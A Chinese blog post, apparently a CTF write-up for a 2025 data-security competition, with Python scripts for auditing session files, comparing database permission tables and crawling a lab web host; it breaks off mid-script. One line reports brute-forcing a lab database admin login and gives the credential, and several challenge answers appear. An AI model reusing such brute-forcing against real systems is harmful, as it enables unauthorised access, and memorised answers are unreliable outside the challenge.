<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="3.1 数据安全综合场景赛 数据删除与恢复 题目1 就99个用户，挨个登录，发现就三种情况：admin 可登录 用户信息未找到\nadmin就是zhangzehua\n猜测用户信息未找到的用户为答案，wangguizhi_ningxiurong_zhanglihua_mengpeng_gantingting\n"><title>2025数字安全产业积分争夺赛WP</title><link rel=canonical href=https://XiaoYuan-420.gituhub.io/p/2025%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9Bwp/><link rel=stylesheet href=/scss/style.min.b9c8156d464c343bdacaf14a871581fb94cbbdb9dd5cbce4ba017361187cc930.css><meta property='og:title' content="2025数字安全产业积分争夺赛WP"><meta property='og:description' content="3.1 数据安全综合场景赛 数据删除与恢复 题目1 就99个用户，挨个登录，发现就三种情况：admin 可登录 用户信息未找到\nadmin就是zhangzehua\n猜测用户信息未找到的用户为答案，wangguizhi_ningxiurong_zhanglihua_mengpeng_gantingting\n"><meta property='og:url' content='https://XiaoYuan-420.gituhub.io/p/2025%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9Bwp/'><meta property='og:site_name' content='萧垣的博客'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:tag' content='AI'><meta property='article:tag' content='WP'><meta property='article:published_time' content='2025-04-22T11:54:05+08:00'><meta property='article:modified_time' content='2025-04-22T11:54:05+08:00'><meta name=twitter:title content="2025数字安全产业积分争夺赛WP"><meta name=twitter:description content="3.1 数据安全综合场景赛 数据删除与恢复 题目1 就99个用户，挨个登录，发现就三种情况：admin 可登录 用户信息未找到\nadmin就是zhangzehua\n猜测用户信息未找到的用户为答案，wangguizhi_ningxiurong_zhanglihua_mengpeng_gantingting\n"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_41aa3f859660d43e.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>🌈</span></figure><div class=site-meta><h1 class=site-name><a href=/>萧垣的博客</a></h1><h2 class=site-description>Stay hungry, stay foolish.</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/355858066 target=_blank title=Bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/NTFago target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#31-数据安全综合场景赛>3.1 数据安全综合场景赛</a><ol><li><a href=#数据删除与恢复-题目1>数据删除与恢复 题目1</a></li><li><a href=#数据识别与审计-题目1>数据识别与审计 题目1</a></li><li><a href=#数据识别与审计-题目2>数据识别与审计 题目2</a></li><li><a href=#数据识别与审计-题目3>数据识别与审计 题目3</a></li><li><a href=#数据识别与审计-题目4>数据识别与审计 题目4</a></li><li><a href=#模型环境安全-2>模型环境安全 2</a></li><li><a href=#模型环境安全-3>模型环境安全 3</a></li></ol></li><li><a href=#32-人工智能模型数据安全挑战赛>3.2 人工智能模型数据安全挑战赛</a><ol><li><a href=#模型推理安全-1>模型推理安全 1</a></li><li><a href=#模型推理安全-2>模型推理安全 2</a></li><li><a href=#模型训练安全-1>模型训练安全 1</a></li><li><a href=#模型训练安全-2>模型训练安全 2</a></li><li><a href=#模型隐私攻击-1>模型隐私攻击 1</a></li><li><a href=#模型隐私攻击-2>模型隐私攻击 2</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/2025%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9Bwp/>2025数字安全产业积分争夺赛WP</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2025-04-22</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>阅读时长: 10 分钟</time></div></footer></div></header><section class=article-content><h2 id=31-数据安全综合场景赛>3.1 数据安全综合场景赛</h2><h3 id=数据删除与恢复-题目1>数据删除与恢复 题目1</h3><p>就99个用户，挨个登录，发现就三种情况：admin 可登录 用户信息未找到</p><p>admin就是zhangzehua</p><p>猜测用户信息未找到的用户为答案，wangguizhi_ningxiurong_zhanglihua_mengpeng_gantingting</p><h3 id=数据识别与审计-题目1>数据识别与审计 题目1</h3><p>将流量包的HTTP流导出为json文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ast</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sessions</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=s2>&#34;./session&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>preg</span> <span class=o>=</span> <span class=s2>&#34;./session/session_&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_values</span><span class=p>(</span><span class=n>session_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 使用正则表达式来匹配键值对</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;\&#34;login_id\&#34;;i:(\d+).*?&#34;is_admin&#34;;b:(\d+);&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>session_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 将结果转换为字典</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=k>match</span> <span class=ow>in</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=k>match</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span> <span class=o>=</span> <span class=k>match</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>value</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=k>match</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=k>if</span> <span class=s2>&#34;i:&#34;</span> <span class=ow>in</span> <span class=n>session_data</span> <span class=k>else</span> <span class=nb>bool</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=k>match</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=p>[</span><span class=n>key</span><span class=p>]</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_file</span><span class=p>(</span><span class=n>cookie</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>preg</span><span class=o>+</span><span class=n>cookie</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_name</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>extract_values</span><span class=p>(</span><span class=n>session</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;header.json&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_header</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>request</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>cookie</span> <span class=o>=</span> <span class=n>request</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s2>&#34;_source&#34;</span><span class=p>][</span><span class=s2>&#34;layers&#34;</span><span class=p>][</span><span class=s2>&#34;http&#34;</span><span class=p>][</span><span class=s2>&#34;http.cookie&#34;</span><span class=p>][</span><span class=mi>10</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>search_id</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>request</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s2>&#34;_source&#34;</span><span class=p>][</span><span class=s2>&#34;layers&#34;</span><span class=p>][</span><span class=s2>&#34;urlencoded-form&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>items</span><span class=p>())[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>][</span><span class=s2>&#34;urlencoded-form.value&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span> <span class=o>=</span> <span class=n>read_file</span><span class=p>(</span><span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>login_id</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>session</span><span class=o>.</span><span class=n>items</span><span class=p>())[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>is_admin</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>session</span><span class=o>.</span><span class=n>items</span><span class=p>())[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>is_admin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>login_id</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>int</span><span class=p>(</span><span class=n>search_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>login_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>read_header</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>答案：607_715_867_1133</strong></p><h3 id=数据识别与审计-题目2>数据识别与审计 题目2</h3><p>数据库管理界面在133网段，爆破出管理员的用户:密码为zhangzehua:zhangzehua@cimer..</p><p>导出adminers库中的数据，将pdf转为csv</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pandas</span> <span class=k>as</span> <span class=nn>pd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>database</span> <span class=o>=</span> <span class=n>pd</span><span class=o>.</span><span class=n>read_csv</span><span class=p>(</span><span class=s2>&#34;user.csv&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>local</span> <span class=o>=</span> <span class=n>pd</span><span class=o>.</span><span class=n>read_csv</span><span class=p>(</span><span class=s2>&#34;用户权限表.csv&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>comparison_result</span> <span class=o>=</span> <span class=n>database</span><span class=o>.</span><span class=n>merge</span><span class=p>(</span><span class=n>local</span><span class=p>,</span> <span class=n>on</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;Host&#34;</span><span class=p>,</span><span class=s2>&#34;User&#34;</span><span class=p>,</span><span class=s2>&#34;Select_priv&#34;</span><span class=p>,</span><span class=s2>&#34;Insert_priv&#34;</span><span class=p>,</span><span class=s2>&#34;Update_priv&#34;</span><span class=p>,</span><span class=s2>&#34;Delete_priv&#34;</span><span class=p>],</span> <span class=n>how</span><span class=o>=</span><span class=s1>&#39;outer&#39;</span><span class=p>,</span> <span class=n>indicator</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>difference</span> <span class=o>=</span> <span class=n>comparison_result</span><span class=p>[</span><span class=n>comparison_result</span><span class=p>[</span><span class=s1>&#39;_merge&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;both&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>left</span> <span class=o>=</span> <span class=n>difference</span><span class=p>[</span><span class=n>difference</span><span class=p>[</span><span class=s2>&#34;_merge&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;left_only&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>right</span> <span class=o>=</span> <span class=n>difference</span><span class=p>[</span><span class=n>difference</span><span class=p>[</span><span class=s2>&#34;_merge&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;right_only&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>left</span><span class=o>.</span><span class=n>to_excel</span><span class=p>(</span><span class=s2>&#34;left.xlsx&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>right</span><span class=o>.</span><span class=n>to_excel</span><span class=p>(</span><span class=s2>&#34;right.xlsx&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>对比两边表即可</p><p><strong>答案:9_3_9</strong></p><h3 id=数据识别与审计-题目3>数据识别与审计 题目3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;http://192.168.81.133/?page=&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># response = requests.get(base_url+&#34;1&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>links</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>31</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 检查请求是否成功</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 解析HTML内容</span>
</span></span><span class=line><span class=cl>        <span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>,</span> <span class=s1>&#39;html.parser&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 使用选择器获取所有超链接</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>51</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>link</span> <span class=ow>in</span> <span class=n>soup</span><span class=o>.</span><span class=n>select</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;body &gt; div &gt; div.row &gt; div:nth-child(</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>) &gt; div &gt; div &gt; p &gt; a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>href</span> <span class=o>=</span> <span class=n>link</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;href&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>href</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>links</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>href</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;links&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>json</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=n>links</span><span class=p>,</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>links</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;links.json&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>links</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>links</span> <span class=o>=</span> <span class=n>links</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>disallow</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/logs&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/user\/profile&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/api&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/admin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/private\/folder&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/debug&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/details&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/.*\.bak$&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/\?token=&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>allow</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/download&#34;</span><span class=p>,</span>
